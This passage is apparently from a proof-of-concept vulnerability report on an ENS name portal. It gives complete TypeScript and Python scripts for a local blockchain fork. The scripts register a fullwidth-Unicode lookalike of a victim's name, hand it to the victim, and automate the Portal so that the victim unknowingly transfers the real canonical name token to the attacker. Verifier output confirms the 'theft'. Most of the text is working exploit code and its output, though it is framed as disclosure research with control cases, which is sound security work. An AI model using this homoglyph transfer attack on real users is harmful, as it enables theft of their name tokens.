  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
])

type Account = typeof victim | typeof attacker

type PendingRegistration = {
  label: string
  owner: Account
  secret: Hash
}

const assert = (condition: unknown, message: string): asserts condition => {
  if (!condition) throw new Error(`ASSERTION_FAILED: ${message}`)
}

const sameAddress = (a: Address, b: Address) =>
  a.toLowerCase() === b.toLowerCase()

const walletFor = (owner: Account) =>
  sameAddress(owner.address, victim.address) ? victimClient : attackerClient

async function wait(hash: Hash) {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  assert(receipt.status === 'success', `transaction ${hash} reverted`)
  return receipt
}

async function prepareRegistration(
  label: string,
  owner: Account,
): Promise<PendingRegistration> {
  const available = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'isAvailable',
    args: [label],
  })
  assert(available, `${label} is unexpectedly unavailable on the fork`)

  const secret = keccak256(toHex(`raw-transfer-r7m3k9:${label}`))
  const commitment = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      zeroAddress,
      registrationDuration,
      zeroHash,
    ],
  })

  await wait(
    await walletFor(owner).writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )

  return { label, owner, secret }
}

async function finishRegistration(pending: PendingRegistration) {
  const [base, premium] = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'getRegisterPrice',
    args: [pending.label, registrationDuration, usdc],
  })
  const balance = await publicClient.readContract({
    address: usdc,
    abi: erc20Abi,
    functionName: 'balanceOf',
    args: [pending.owner.address],
  })
  assert(balance >= base + premium, `${pending.label} owner lacks USDC`)

  await wait(
    await walletFor(pending.owner).writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'register',
      args: [
        pending.label,
        pending.owner.address,
        pending.secret,
        zeroAddress,
        zeroAddress,
        registrationDuration,
        usdc,
        zeroHash,
      ],
    }),
  )
}

async function balanceOf(owner: Address, tokenId: bigint) {
  return publicClient.readContract({
    address: registry,
    abi: erc1155Abi,
    functionName: 'balanceOf',
    args: [owner, tokenId],
  })
}

async function stateOf(tokenId: bigint) {
  return publicClient.readContract({
    address: registry,
    abi: permissionedRegistryGetStateSnippet,
    functionName: 'getState',
    args: [tokenId],
  })
}

async function assertAuditedSourceShape() {
  const [transferHook, transferRoute, roleHook, transferHelper] =
    await Promise.all([
      readFile(
        new URL(
          '../../apps/portal/src/features/transfer/hooks/useTransferName.ts',
          import.meta.url,
        ),
        'utf8',
      ),
      readFile(
        new URL(
          '../../apps/portal/src/routes/$name/ownership/transfer.tsx',
          import.meta.url,
        ),
        'utf8',
      ),
      readFile(
        new URL(
          '../../apps/portal/src/features/transfer/hooks/useCanTransferName.ts',
          import.meta.url,
        ),
        'utf8',
      ),
      readFile(
        new URL(
          '../../apps/portal/src/features/transfer/helpers/transferToken.ts',
          import.meta.url,
        ),
        'utf8',
      ),
    ])

  assert(
    transferRoute.includes('getEnsOwnerQueryOptions({ name })'),
    'raw route name no longer drives owner lookup',
  )
  assert(
    roleHook.includes('return getLabel(name)'),
    'transfer-role check no longer normalizes the route name',
  )
  assert(
    transferHook.includes('label: getLabel(name)'),
    'token-id preparation no longer normalizes the route name',
  )
  assert(
    transferHook.includes('transactionName: `${STEP_LABELS[step]} - ${name}`'),
    'modal no longer labels transactions with the raw route name',
  )
  assert(
    transferHelper.includes("functionName: 'safeTransferFrom'"),
    'transfer sink is no longer ERC-1155 safeTransferFrom',
  )
}

async function main() {
  await assertAuditedSourceShape()

  // Well-known Anvil EOAs currently have EIP-7702 code on Sepolia. Remove it
  // only in the local fork so ERC-1155 mint/receive behavior matches an EOA.
  await testClient.setCode({ address: victim.address, bytecode: '0x' })
  await testClient.setCode({ address: attacker.address, bytecode: '0x' })

  for (const owner of [victim, attacker]) {
    await wait(
      await victimClient.writeContract({
        address: usdc,
        abi: erc20Abi,
        functionName: 'mint',
        args: [owner.address, 100_000_000_000n],
      }),
    )
    await wait(
      await walletFor(owner).writeContract({
        address: usdc,
        abi: erc20Abi,
        functionName: 'approve',
        args: [registrar, maxUint256],
      }),
    )
  }

  const forkBlock = await publicClient.getBlockNumber()
  const suffix = `${forkBlock.toString(36)}${Date.now().toString(36).slice(-5)}`
  const canonicalLabel = `r7m3k9${suffix}`
  const rawLabel = `\uFF32${canonicalLabel.slice(1)}`
  const canonicalName = `${canonicalLabel}.eth`
  const rawName = `${rawLabel}.eth`

  assert(normalize(rawLabel) === canonicalLabel, 'raw label does not normalize to canonical')
  assert(rawLabel !== canonicalLabel, 'raw and canonical labels are byte-identical')

  const pendingCanonical = await prepareRegistration(canonicalLabel, victim)
  const pendingRaw = await prepareRegistration(rawLabel, attacker)
  const minAge = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minAge) + 1 })
  await testClient.mine({ blocks: 1 })
  await finishRegistration(pendingCanonical)
  await finishRegistration(pendingRaw)

  const canonicalTokenId = await getTokenId(publicClient, {
    label: canonicalLabel,
    registryAddress: registry,
  })
  const rawTokenId = await getTokenId(publicClient, {
    label: rawLabel,
    registryAddress: registry,
  })
  assert(canonicalTokenId !== rawTokenId, 'raw and canonical token IDs collided')

  const [canonicalStateBefore, rawStateBefore] = await Promise.all([
    stateOf(canonicalTokenId),
    stateOf(rawTokenId),
  ])
  assert(
    sameAddress(canonicalStateBefore.latestOwner, victim.address),
    'victim does not own canonical token after registration',
  )
  assert(
    sameAddress(rawStateBefore.latestOwner, attacker.address),
    'attacker does not own raw token after registration',
  )

  const attackerCanTransferRaw = await hasRoles(publicClient, {
    registryAddress: registry,
    label: rawLabel,
    roles: ['ROLE_CAN_TRANSFER_ADMIN'],
    account: attacker.address,
  })
  assert(attackerCanTransferRaw, 'attacker lacks raw transfer role')

  const rawDeliveryHash = await attackerClient.writeContract({
    address: registry,
    abi: erc1155Abi,
    functionName: 'safeTransferFrom',
    args: [attacker.address, victim.address, rawTokenId, 1n, '0x'],
  })
  await wait(rawDeliveryHash)

  const [rawOwner, canonicalOwner, rawRegistries, canonicalRegistries] =
    await Promise.all([
      getOwner(publicClient, { name: rawName }),
      getOwner(publicClient, { name: canonicalName }),
      getNameRegistries(publicClient, { name: rawName }),
      getNameRegistries(publicClient, { name: canonicalName }),
    ])
  assert(sameAddress(rawOwner, victim.address), 'raw owner lookup does not return victim')
  assert(
    sameAddress(canonicalOwner, victim.address),
    'canonical owner lookup does not return victim',
  )
  assert(
    rawRegistries[1] && sameAddress(rawRegistries[1], registry),
    'raw owner lookup did not resolve through the expected registry',
  )
  assert(
    canonicalRegistries[1] && sameAddress(canonicalRegistries[1], registry),
    'canonical owner lookup did not resolve through the expected registry',
  )

  const victimCanTransferCanonical = await hasRoles(publicClient, {
    registryAddress: registry,
    label: canonicalLabel,
    roles: ['ROLE_CAN_TRANSFER_ADMIN'],
    account: victim.address,
  })
  assert(
    victimCanTransferCanonical,
    'normalized Portal role check would block the victim',
  )

  const balances = {
    victimRaw: await balanceOf(victim.address, rawTokenId),
    victimCanonical: await balanceOf(victim.address, canonicalTokenId),
    attackerRaw: await balanceOf(attacker.address, rawTokenId),
    attackerCanonical: await balanceOf(attacker.address, canonicalTokenId),
  }
  assert(balances.victimRaw === 1n, 'victim did not receive raw token')
  assert(balances.victimCanonical === 1n, 'victim does not retain canonical token')
  assert(balances.attackerRaw === 0n, 'attacker still owns raw token')
  assert(balances.attackerCanonical === 0n, 'attacker already owns canonical token')

  const preUiBlockNumber = await publicClient.getBlockNumber()
  const state = {
    proof: 'raw-label-transfer-r7m3k9',
    rpcUrl,
    chainId: localSepolia.id,
    registrar,
    registry,
    usdc,
    victim: victim.address,
    attacker: attacker.address,
    canonicalLabel,
    rawLabel,
    canonicalName,
    rawName,
    portalRoute: `/${rawName}/ownership/transfer`,
    canonicalTokenId: canonicalTokenId.toString(),
    rawTokenId: rawTokenId.toString(),
    rawDeliveryHash,
    forkBlockNumber: forkBlock.toString(),
    preUiBlockNumber: preUiBlockNumber.toString(),
    victimCanTransferCanonical,
    ownerLookup: {
      raw: rawOwner,
      canonical: canonicalOwner,
    },
    registries: {
      raw: rawRegistries,
      canonical: canonicalRegistries,
    },
    balancesBeforeUi: Object.fromEntries(
      Object.entries(balances).map(([key, value]) => [key, value.toString()]),
    ),
  }

  await writeFile(outputPath, `${JSON.stringify(state, null, 2)}\n`)
  console.log(JSON.stringify(state, null, 2))
  console.log('SEED_RESULT=PASS_PRECONDITIONS_R7M3K9')
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

The real-browser driver opens the percent-encoded fullwidth route, requires the raw name in the page and modal, triggers one wallet request through the target-provided mock connector, and records the request and screenshots. Save it as `ens-fullwidth-poc/scripts/drive-portal-transfer-r7m3k9.py`:

```python
import json
import os
from pathlib import Path
from urllib.parse import quote

from playwright.sync_api import TimeoutError as PlaywrightTimeoutError
from playwright.sync_api import sync_playwright


STATE_PATH = Path(os.environ["POC_STATE_PATH"])
ARTIFACT_DIR = Path(os.environ["POC_ARTIFACT_DIR"])
PORTAL_URL = os.environ.get("PORTAL_URL", "http://127.0.0.1:3001")


def require(condition: bool, message: str) -> None:
    if not condition:
        raise RuntimeError(f"ASSERTION_FAILED: {message}")


state = json.loads(STATE_PATH.read_text(encoding="utf-8"))
raw_name = state["rawName"]
attacker = state["attacker"]
route = f"/{quote(raw_name, safe='.')}/ownership/transfer"
ARTIFACT_DIR.mkdir(parents=True, exist_ok=True)

console_entries = []
page_errors = []
rpc_entries = []


def record_console(message) -> None:
    console_entries.append({"type": message.type, "text": message.text})


def record_request(request) -> None:
    if request.method != "POST" or "127.0.0.1:18547" not in request.url:
        return
    try:
        payload = json.loads(request.post_data or "null")
    except json.JSONDecodeError:
        return
    entries = payload if isinstance(payload, list) else [payload]
    for entry in entries:
        if isinstance(entry, dict) and entry.get("method") == "eth_sendTransaction":
            rpc_entries.append(entry)


with sync_playwright() as playwright:
    browser = playwright.chromium.launch(headless=True)
    context = browser.new_context(viewport={"width": 1440, "height": 1100})
    page = context.new_page()
    page.on("console", record_console)
    page.on("pageerror", lambda error: page_errors.append(str(error)))
    page.on("request", record_request)

    page.goto(f"{PORTAL_URL}{route}", wait_until="domcontentloaded", timeout=60_000)
    try:
        page.wait_for_load_state("networkidle", timeout=15_000)
    except PlaywrightTimeoutError:
        pass

    page.get_by_role("heading", name="Transfer ownership").wait_for(timeout=45_000)
    recipient_input = page.get_by_placeholder("ENS name or address")
    recipient_input.wait_for(state="visible", timeout=45_000)

    initial_text = page.locator("body").inner_text()
    (ARTIFACT_DIR / "01-initial-dom-r7m3k9.txt").write_text(
        initial_text, encoding="utf-8"
    )
    require(raw_name in initial_text, "Portal does not display the raw route name")
    require("Not authorized" not in initial_text, "raw owner lookup rejected victim")
    require("Transfer not available" not in initial_text, "normalized role gate blocked flow")
    page.screenshot(
        path=str(ARTIFACT_DIR / "01-raw-transfer-page-r7m3k9.png"),
        full_page=True,
    )

    recipient_input.fill(attacker)
    page.get_by_text(attacker, exact=False).first.wait_for(timeout=20_000)
    transfer_button = page.get_by_role("button", name="Transfer name", exact=True)
    transfer_button.wait_for(state="visible")
    page.wait_for_function(
        "button => !button.disabled",
        arg=transfer_button.element_handle(),
        timeout=30_000,
    )
    page.screenshot(
        path=str(ARTIFACT_DIR / "02-pre-submit-raw-ui-r7m3k9.png"),
        full_page=True,
    )

    transfer_button.click()
    dialog = page.get_by_role("dialog")
    dialog.wait_for(state="visible", timeout=30_000)
    dialog.get_by_role("button", name="Start", exact=True).click()

    raw_transaction_label = f"Transfer name - {raw_name}"
    dialog.get_by_text(raw_transaction_label, exact=True).wait_for(timeout=20_000)
    modal_before = dialog.inner_text()
    require(
        raw_transaction_label in modal_before,
        "confirmation state does not label the transaction with the raw name",
    )
    page.screenshot(
        path=str(ARTIFACT_DIR / "03-modal-shows-raw-name-r7m3k9.png"),
        full_page=True,
    )

    dialog.get_by_role("button", name="Open wallet", exact=True).click()
    done_button = dialog.get_by_role("button", name="Done", exact=True)
    done_button.wait_for(state="visible", timeout=60_000)
    modal_after = dialog.inner_text()
    require(raw_transaction_label in modal_after, "success state lost raw transaction label")
    page.screenshot(
        path=str(ARTIFACT_DIR / "04-success-still-shows-raw-r7m3k9.png"),
        full_page=True,
    )

    require(len(rpc_entries) == 1, f"expected one wallet send, captured {len(rpc_entries)}")
    wallet_request = rpc_entries[0]["params"][0]
    require(
        wallet_request.get("from", "").lower() == state["victim"].lower(),
        "wallet request sender is not victim",
    )
    require(
        wallet_request.get("to", "").lower() == state["registry"].lower(),
        "wallet request target is not the ENS registry",
    )

    evidence = {
        "verdict": "PASS_REAL_PORTAL_SINGLE_TRANSFER_R7M3K9",
        "url": page.url,
        "rawName": raw_name,
        "canonicalName": state["canonicalName"],
        "recipient": attacker,
        "initialUiContainsRawName": raw_name in initial_text,
        "modalTransactionLabel": raw_transaction_label,
        "walletRpcRequest": wallet_request,
        "console": console_entries,
        "pageErrors": page_errors,
    }
    (ARTIFACT_DIR / "browser-evidence-r7m3k9.json").write_text(
        json.dumps(evidence, indent=2) + "\n", encoding="utf-8"
    )
    (ARTIFACT_DIR / "browser-console-r7m3k9.json").write_text(
        json.dumps(console_entries, indent=2) + "\n", encoding="utf-8"
    )
    print(json.dumps(evidence, indent=2))
    print(evidence["verdict"])
    browser.close()
```

In the validated run, the browser displayed `Ｒ7m3k96vzuzcereu.eth`, the modal said `Transfer name - Ｒ7m3k96vzuzcereu.eth`, and exactly one `eth_sendTransaction` targeted the ENSv2 registry. The decoded request was:

```
function: safeTransferFrom
from:     0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
to:       0x70997970C51812dc3A010C7d01b50e0d17dc79C8
tokenId:  0x6c56514e12a4ad42ca67202250eb2c8d3fc9da76c1e617692490a23a00000000
amount:   1
data:     0x
```

The decoder returned canonical token ID `0x6c56514e12a4ad42ca67202250eb2c8d3fc9da76c1e617692490a23a00000000` instead of displayed raw token ID `0x4e11720eb6ae184bea8e6b6a05894c7a092fc58b906e742890e11fe100000000`.

### Runtime verdicts

The browser-level witness is summarized as:

```json
{
  "verdict": "PASS_REAL_PORTAL_SINGLE_TRANSFER_R7M3K9",
  "rawName": "Ｒ7m3k96vzuzcereu.eth",
  "canonicalName": "r7m3k96vzuzcereu.eth",
  "modalTransactionLabel": "Transfer name - Ｒ7m3k96vzuzcereu.eth",
  "walletRequestCount": 1,
  "pageErrors": []
}
```

The essential fields produced by the chain verifier were:

```json
{
  "proof": "raw-label-transfer-r7m3k9",
  "verdict": "PASS_L5_RAW_UI_CANONICAL_NFT_THEFT_R7M3K9",
  "uiShownName": "Ｒ7m3k96vzuzcereu.eth",
  "ownerLookupSubject": "Ｒ7m3k96vzuzcereu.eth",
  "roleCheckLabel": "r7m3k96vzuzcereu",
  "preparedTokenId": "49002297640857006426497332284882910203487286217058892903850853057531526250496",
  "displayedRawTokenId": "35311225785357253866070802442806932623119095826058754000276912775002203357184",
  "transaction": {
    "hash": "0x2301e9f647d5e488454f1d8df71ad62b1ba72f8005070405b4c2bdaf184aee2a",
    "tokenId": "49002297640857006426497332284882910203487286217058892903850853057531526250496",
    "amount": "1"
  },
  "receipt": {
    "status": "success",
    "gasUsed": "77890"
  },
  "balancesAfter": {
    "victimRaw": "1",
    "victimCanonical": "0",
    "attackerRaw": "0",
    "attackerCanonical": "1"
  },
  "capabilitiesAfter": {
    "victimRawTransferRole": true,
    "victimCanonicalTransferRole": false,
    "attackerCanonicalTransferRole": true
  }
}
```

The chain verifier finds the only victim-to-registry ERC-1155 transfer after seeding, decodes it, requires the canonical token ID and successful receipt, then checks owners, balances, and transfer roles. Save it as `ens-fullwidth-poc/scripts/poc-raw-label-transfer-verify-r7m3k9.ts`:

```typescript
import { readFile, writeFile } from 'node:fs/promises'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getOwner, hasRoles } from '@ensdomains/ensjs/public/v2'
import {
  type Address,
  createPublicClient,
  decodeFunctionData,
  erc1155Abi,
  http,
} from 'viem'
import { sepolia } from 'viem/chains'

const statePath = process.env.POC_STATE_PATH
const outputPath = process.env.POC_VERIFY_PATH
const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:18547'

if (!statePath) throw new Error('POC_STATE_PATH is required')
if (!outputPath) throw new Error('POC_VERIFY_PATH is required')

type SeedState = {
  proof: string
  registry: Address
  victim: Address
  attacker: Address
  canonicalLabel: string
  rawLabel: string
  canonicalName: string
  rawName: string
  canonicalTokenId: string
  rawTokenId: string
  preUiBlockNumber: string
}

const localSepolia = extendChainWithEns({
  ...sepolia,
  rpcUrls: {
    default: { http: [rpcUrl] },
    public: { http: [rpcUrl] },
  },
})
const publicClient = createPublicClient({
  chain: localSepolia,
  transport: http(rpcUrl),
})

const assert = (condition: unknown, message: string): asserts condition => {
  if (!condition) throw new Error(`ASSERTION_FAILED: ${message}`)
}

const sameAddress = (a: Address, b: Address) =>
  a.toLowerCase() === b.toLowerCase()

async function balanceOf(owner: Address, tokenId: bigint) {
  return publicClient.readContract({
    address: state.registry,
    abi: erc1155Abi,
    functionName: 'balanceOf',
    args: [owner, tokenId],
  })
}

const state = JSON.parse(await readFile(statePath, 'utf8')) as SeedState

async function main() {
  assert(state.proof === 'raw-label-transfer-r7m3k9', 'seed state belongs to another proof')
  const canonicalTokenId = BigInt(state.canonicalTokenId)
  const rawTokenId = BigInt(state.rawTokenId)
  const firstUiBlock = BigInt(state.preUiBlockNumber) + 1n
  const latestBlock = await publicClient.getBlockNumber()
  assert(latestBlock >= firstUiBlock, 'Portal did not mine a post-seed transaction')

  const decodedTransfers = []
  for (let blockNumber = firstUiBlock; blockNumber <= latestBlock; blockNumber++) {
    const block = await publicClient.getBlock({
      blockNumber,
      includeTransactions: true,
    })
    for (const transaction of block.transactions) {
      if (typeof transaction === 'string') continue
      if (
        !transaction.to ||
        !sameAddress(transaction.from, state.victim) ||
        !sameAddress(transaction.to, state.registry)
      ) {
        continue
      }

      try {
        const decoded = decodeFunctionData({
          abi: erc1155Abi,
          data: transaction.input,
        })
        if (decoded.functionName !== 'safeTransferFrom') continue
        const [from, to, tokenId, amount, data] = decoded.args
        decodedTransfers.push({
          hash: transaction.hash,
          blockNumber: blockNumber.toString(),
          calldata: transaction.input,
          from,
          to,
          tokenId: tokenId.toString(),
          amount: amount.toString(),
          data,
        })
      } catch {}
    }
  }

  assert(decodedTransfers.length === 1, `expected one Portal transfer, found ${decodedTransfers.length}`)
  const transfer = decodedTransfers[0]
  assert(sameAddress(transfer.from, state.victim), 'calldata sender is not victim')
  assert(sameAddress(transfer.to, state.attacker), 'calldata recipient is not attacker')
  assert(
    BigInt(transfer.tokenId) === canonicalTokenId,
    'Portal did not encode canonical token ID',
  )
  assert(BigInt(transfer.tokenId) !== rawTokenId, 'Portal encoded the displayed raw token ID')
  assert(transfer.amount === '1', 'Portal transfer amount is not one')
  assert(transfer.data === '0x', 'Portal transfer callback data is non-empty')

  const receipt = await publicClient.getTransactionReceipt({ hash: transfer.hash })
  assert(receipt.status === 'success', 'Portal transaction reverted')

  const [rawOwner, canonicalOwner] = await Promise.all([
    getOwner(publicClient, { name: state.rawName }),
    getOwner(publicClient, { name: state.canonicalName }),
  ])
  const balances = {
    victimRaw: await balanceOf(state.victim, rawTokenId),
    victimCanonical: await balanceOf(state.victim, canonicalTokenId),
    attackerRaw: await balanceOf(state.attacker, rawTokenId),
    attackerCanonical: await balanceOf(state.attacker, canonicalTokenId),
  }

  assert(sameAddress(rawOwner, state.victim), 'displayed raw name left victim ownership')
  assert(sameAddress(canonicalOwner, state.attacker), 'canonical name did not move to attacker')
  assert(balances.victimRaw === 1n, 'victim lost displayed raw token')
  assert(balances.victimCanonical === 0n, 'victim retained canonical token')
  assert(balances.attackerRaw === 0n, 'attacker received displayed raw token')
  assert(balances.attackerCanonical === 1n, 'attacker did not receive canonical token')

  const [victimRawRole, victimCanonicalRole, attackerCanonicalRole] =
    await Promise.all([
      hasRoles(publicClient, {
        registryAddress: state.registry,
        label: state.rawLabel,
        roles: ['ROLE_CAN_TRANSFER_ADMIN'],
        account: state.victim,
      }),
      hasRoles(publicClient, {
        registryAddress: state.registry,
        label: state.canonicalLabel,
        roles: ['ROLE_CAN_TRANSFER_ADMIN'],
        account: state.victim,
      }),
      hasRoles(publicClient, {
        registryAddress: state.registry,
        label: state.canonicalLabel,
        roles: ['ROLE_CAN_TRANSFER_ADMIN'],
        account: state.attacker,
      }),
    ])
  assert(victimRawRole, 'victim lost capability on displayed raw name')
  assert(!victimCanonicalRole, 'victim retained canonical transfer capability')
  assert(attackerCanonicalRole, 'attacker did not gain canonical transfer capability')

  const result = {
    proof: state.proof,
    verdict: 'PASS_L5_RAW_UI_CANONICAL_NFT_THEFT_R7M3K9',
    uiShownName: state.rawName,
    ownerLookupSubject: state.rawName,
    roleCheckLabel: state.canonicalLabel,
    preparedTokenId: state.canonicalTokenId,
    displayedRawTokenId: state.rawTokenId,
    transaction: transfer,
    receipt: {
      status: receipt.status,
      blockNumber: receipt.blockNumber.toString(),
      gasUsed: receipt.gasUsed.toString(),
    },
    ownersAfter: {
      raw: rawOwner,
      canonical: canonicalOwner,
    },
    balancesAfter: Object.fromEntries(
      Object.entries(balances).map(([key, value]) => [key, value.toString()]),
    ),
    capabilitiesAfter: {
      victimRawTransferRole: victimRawRole,
      victimCanonicalTransferRole: victimCanonicalRole,
      attackerCanonicalTransferRole: attackerCanonicalRole,
    },
  }

  await writeFile(outputPath, `${JSON.stringify(result, null, 2)}\n`)
  console.log(JSON.stringify(result, null, 2))
  console.log(result.verdict)
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

The verified post-state is raw balance `1` for the victim, canonical balance `0` for the victim, canonical balance `1` for the attacker, raw transfer role retained by the victim, canonical transfer role removed from the victim, and canonical transfer role gained by the attacker.

### Attached code and integrity

The remaining three files implement the two controls. The raw-only case registers and delivers a raw token without its normalized sibling, requiring Portal to show `Transfer not available` and emit no wallet request. The canonical case uses a normalized name and requires Portal to display and transfer the same token. Together they distinguish the vulnerable identity split from a generic browser, wallet, registry, or ERC-1155 artifact.

Save the control seed as `ens-fullwidth-poc/scripts/poc-raw-label-transfer-control-seed-r7m3k9.ts`:

```typescript
import { writeFile } from 'node:fs/promises'
import {
  ensL1Contracts,
  extendChainWithEns,
  supportedL1Chains,
} from '@ensdomains/ensjs/chain'
import { getOwner, getTokenId, hasRoles } from '@ensdomains/ensjs/public/v2'
import { normalize } from '@ensdomains/ensjs/utils'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  erc1155Abi,
  type Hash,
  http,
  keccak256,
  maxUint256,
  parseAbi,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:18547'
const outputPath = process.env.POC_CONTROL_STATE_PATH
if (!outputPath) throw new Error('POC_CONTROL_STATE_PATH is required')

const chain = extendChainWithEns({
  ...sepolia,
  rpcUrls: {
    default: { http: [rpcUrl] },
    public: { http: [rpcUrl] },
  },
})
const transport = http(rpcUrl)
const publicClient = createPublicClient({ chain, transport })
const testClient = createTestClient({ chain, transport, mode: 'anvil' })
const victim = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const victimClient = createWalletClient({ account: victim, chain, transport })
const attackerClient = createWalletClient({ account: attacker, chain, transport })

const contracts = ensL1Contracts[supportedL1Chains.sepolia]
const registrar = contracts.ensEthRegistrar.address
const registry = contracts.ensRegistry.address
const usdc = contracts.usdc.address
const duration = 28n * 24n * 60n * 60n
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
  'function isAvailable(string label) view returns (bool)',
])
const erc20Abi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])

type Account = typeof victim | typeof attacker
type Pending = { label: string; owner: Account; secret: Hash }

const assert = (condition: unknown, message: string): asserts condition => {
  if (!condition) throw new Error(`ASSERTION_FAILED: ${message}`)
}
const sameAddress = (a: Address, b: Address) =>
  a.toLowerCase() === b.toLowerCase()
const walletFor = (owner: Account) =>
  sameAddress(owner.address, victim.address) ? victimClient : attackerClient

async function wait(hash: Hash) {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  assert(receipt.status === 'success', `transaction ${hash} reverted`)
}

async function prepare(label: string, owner: Account): Promise<Pending> {
  assert(
    await publicClient.readContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'isAvailable',
      args: [label],
    }),
    `${label} is unavailable`,
  )
  const secret = keccak256(toHex(`control-r7m3k9:${label}`))
  const commitment = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [
      label,
      owner.address,
      secret,
      zeroAddress,
      zeroAddress,
      duration,
      zeroHash,
    ],
  })
  await wait(
    await walletFor(owner).writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )
  return { label, owner, secret }
}

async function finish(pending: Pending) {
  const [base, premium] = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'getRegisterPrice',
    args: [pending.label, duration, usdc],
  })
  assert(base + premium > 0n, 'registration price should be non-zero')
  await wait(
    await walletFor(pending.owner).writeContract({
      address: registrar,
      abi: registrarAbi,
      functionName: 'register',
      args: [
        pending.label,
        pending.owner.address,
        pending.secret,
        zeroAddress,
        zeroAddress,
        duration,
        usdc,
        zeroHash,
      ],
    }),
  )
}

async function main() {
  await testClient.setCode({ address: victim.address, bytecode: '0x' })
  await testClient.setCode({ address: attacker.address, bytecode: '0x' })
  for (const owner of [victim, attacker]) {
    await wait(
      await victimClient.writeContract({
        address: usdc,
        abi: erc20Abi,
        functionName: 'mint',
        args: [owner.address, 100_000_000_000n],
      }),
    )
    await wait(
      await walletFor(owner).writeContract({
        address: usdc,
        abi: erc20Abi,
        functionName: 'approve',
        args: [registrar, maxUint256],
      }),
    )
  }

  const blockNumber = await publicClient.getBlockNumber()
  const suffix = `${blockNumber.toString(36)}${Date.now().toString(36).slice(-5)}`
  const normalLabel = `normalr7${suffix}`
  const rawOnlyLabel = `NoCanonR7${suffix}`
  const normalizedRawOnlyLabel = normalize(rawOnlyLabel)
  assert(rawOnlyLabel !== normalizedRawOnlyLabel, 'raw-only label is already normalized')

  const normalPending = await prepare(normalLabel, victim)
  const rawOnlyPending = await prepare(rawOnlyLabel, attacker)
  const minAge = await publicClient.readContract({
    address: registrar,
    abi: registrarAbi,
    functionName: 'MIN_COMMITMENT_AGE',
  })
  await testClient.increaseTime({ seconds: Number(minAge) + 1 })
  await testClient.mine({ blocks: 1 })
  await finish(normalPending)
  await finish(rawOnlyPending)

  const normalTokenId = await getTokenId(publicClient, {
    registryAddress: registry,
    label: normalLabel,
  })
  const rawOnlyTokenId = await getTokenId(publicClient, {
    registryAddress: registry,
    label: rawOnlyLabel,
  })
  const normalizedMissingTokenId = await getTokenId(publicClient, {
    registryAddress: registry,
    label: normalizedRawOnlyLabel,
  })

  await wait(
    await attackerClient.writeContract({
      address: registry,
      abi: erc1155Abi,
      functionName: 'safeTransferFrom',
      args: [attacker.address, victim.address, rawOnlyTokenId, 1n, '0x'],
    }),
  )

  const normalName = `${normalLabel}.eth`
  const rawOnlyName = `${rawOnlyLabel}.eth`
  const normalizedRawOnlyName = `${normalizedRawOnlyLabel}.eth`
  const [normalOwner, rawOnlyOwner, normalizedRawOnlyOwner] = await Promise.all([
    getOwner(publicClient, { name: normalName }),
    getOwner(publicClient, { name: rawOnlyName }),
    getOwner(publicClient, { name: normalizedRawOnlyName }),
  ])
  assert(sameAddress(normalOwner, victim.address), 'victim does not own normal control')
  assert(sameAddress(rawOnlyOwner, victim.address), 'victim does not own raw-only control')
  assert(
    sameAddress(normalizedRawOnlyOwner, zeroAddress),
    'normalized raw-only sibling unexpectedly exists',
  )

  const normalRole = await hasRoles(publicClient, {
    registryAddress: registry,
    label: normalLabel,
    roles: ['ROLE_CAN_TRANSFER_ADMIN'],
    account: victim.address,
  })
  const missingCanonicalRole = await hasRoles(publicClient, {
    registryAddress: registry,
    label: normalizedRawOnlyLabel,
    roles: ['ROLE_CAN_TRANSFER_ADMIN'],
    account: victim.address,
  })
  assert(normalRole, 'normal-flow control lacks transfer role')
  assert(!missingCanonicalRole, 'raw-only control unexpectedly passes normalized role gate')

  const state = {
    proof: 'raw-label-transfer-controls-r7m3k9',
    rpcUrl,
    registry,
    victim: victim.address,
    attacker: attacker.address,
    normalLabel,
    normalName,
    normalTokenId: normalTokenId.toString(),
    rawOnlyLabel,
    rawOnlyName,
    rawOnlyTokenId: rawOnlyTokenId.toString(),
    normalizedRawOnlyLabel,
    normalizedRawOnlyName,
    normalizedMissingTokenId: normalizedMissingTokenId.toString(),
    ownersBeforeUi: {
      normal: normalOwner,
